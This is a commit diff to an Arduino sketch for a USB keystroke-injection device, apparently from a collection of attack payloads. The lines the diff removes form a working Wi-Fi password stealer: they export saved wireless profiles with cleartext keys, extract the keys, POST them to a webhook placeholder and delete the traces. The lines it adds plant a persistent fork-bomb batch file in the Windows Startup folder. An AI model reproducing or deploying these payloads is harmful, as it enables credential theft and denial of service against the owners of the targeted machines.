206c0f7a39acff9ffd7404d6a47935647814a0ca
Lucas Bustamante <lucascostabustamante@gmail.com>
2023-11-28 00:07:51 -0300

    Update Persistent_Fork_Bomb.ino

--- payloads/Fork_Bomb/Persistent_Fork_Bomb.ino
+++ payloads/Fork_Bomb/Persistent_Fork_Bomb.ino
@@ -1,39 +1,22 @@
+//This script creates fork.bat file which is then run everytime the computer is powered on.
+//Crated by Michyus
 #include "DigiKeyboard.h"
-#define KEY_DOWN 0x51 // Keyboard Down Arrow
-#define KEY_ENTER 0x28 //Return/Enter Key
-
 void setup() {
-  pinMode(1, OUTPUT); //LED on Model A 
 }
 
 void loop() {
-   
-  DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
- 
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
-  DigiKeyboard.delay(800);
-  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //aqui abrirá a janela do cmd de formato pequeno (pequeno apenas no WIN10)
-  DigiKeyboard.delay(1300);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd %temp%"); //going to temporary dir
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri <ADICIONE AQUI A URL DO SEU WEBHOOK> -Method POST -InFile Wi-Fi-PASS"); //Insira a URL do seu webhook
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
-  
-  digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(90000);
-  digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
-  
+  DigiKeyboard.print(F("echo for /l %%x in (0, 0, 0) do start > \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fork.bat\""));
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){ /*empty*/ }
 }
